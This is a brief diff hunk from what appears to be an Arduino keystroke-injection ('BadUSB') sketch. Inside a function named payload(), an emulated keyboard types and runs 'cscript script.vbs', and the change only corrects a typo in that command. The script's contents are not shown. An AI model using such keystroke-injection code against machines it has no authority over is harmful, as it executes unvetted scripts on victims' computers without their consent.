@@ -37,7 +37,7 @@ void payload(){
   Keyboard.write(0x0D);
   Keyboard.write(0x0A);
   delay(100);
-  Keyboard.print("cscript scrpit.vbs");
+  Keyboard.print("cscript script.vbs");
   Keyboard.write(0x0D);
   Keyboard.write(0x0A);
   delay(1000);
